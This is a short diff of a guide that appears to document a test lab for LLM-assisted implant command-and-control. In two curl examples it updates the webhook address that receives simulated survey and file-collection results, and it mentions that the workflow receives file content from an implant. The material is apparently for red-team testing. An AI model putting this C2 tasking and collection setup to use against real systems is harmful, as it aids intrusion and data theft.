@@ -369,7 +369,7 @@ Use the same method to test other decisions. Do not run a real Windows implant u
 For reboot, include evidence that an administrator is logged in:
 
 ```
-curl -fsS -X POST http://20.30.40.155/webhook/agent-survey \
+curl -fsS -X POST http://20.30.40.153:5678/webhook/agent-survey \
   -H 'Content-Type: application/json' \
   -d '{
     "event_type": "survey_result",
@@ -429,7 +429,7 @@ The collection workflow receives file content from the implant, asks the LLM to 
 ### Step 1: Submit a Baseline Collection[](#step-1-submit-a-baseline-collection)
 
 ```
-curl -fsS -X POST http://20.30.40.155/webhook/agent-collection \
+curl -fsS -X POST http://20.30.40.153:5678/webhook/agent-collection \
   -H 'Content-Type: application/json' \
   -d '{
     "event_type": "file_collection_result",
